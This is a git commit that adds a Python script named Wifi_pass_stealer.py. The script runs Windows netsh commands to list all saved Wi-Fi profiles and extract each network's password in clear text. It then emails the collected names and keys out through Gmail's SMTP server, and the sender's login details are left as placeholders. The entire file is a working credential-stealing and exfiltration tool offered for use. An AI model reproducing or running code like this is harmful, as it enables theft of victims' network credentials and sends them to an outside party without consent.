a30c035287080445cf19e89e2586cae2603e6fe2
Siddharth Gupta <68161760+MasterMind321@users.noreply.github.com>
2022-04-26 19:11:48 +0530

    Create Wifi_pass_stealer.py

---
+++ Wifi_pass_stealer.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python
+import smtplib
+import subprocess
+
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+for i in profiles:
+    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+    a = (f'1{profiles}{results}')
+    send_mail("YOUR ID", "AND PASS", a)
+
+
+
+
